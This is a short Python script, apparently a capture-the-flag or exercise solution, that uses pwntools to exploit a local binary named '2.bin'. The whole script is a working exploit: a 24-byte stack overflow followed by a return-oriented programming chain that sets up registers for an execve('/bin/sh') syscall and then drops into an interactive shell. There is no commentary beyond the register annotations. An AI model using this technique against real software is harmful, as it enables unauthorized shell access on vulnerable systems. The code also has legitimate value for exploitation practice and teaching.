
from pwn import *

p = process("./2.bin")
#p = gdb.debug("./2.bin")

chain = b""
chain += p64(0x00000000004012a4)		# pop rax
chain += p64(0x3b)				# 0x3b		SYS_execve
chain += p64(0x00000000004012ae)		# pop rdi
chain += p64(0x404030)				# ptr*   ->  "/bin/sh"
chain += p64(0x00000000004012ac)		# pop rsi		# alt: xor esi, esi
chain += p64(0)					# 0
chain += p64(0x00000000004012aa)		# pop rdx		# alt: sub edx, edx
chain += p64(0)					# 0
chain += p64(0x0000000000401162)		# syscall

p.send(b"A"*24 + chain + b"\n")

p.interactive()


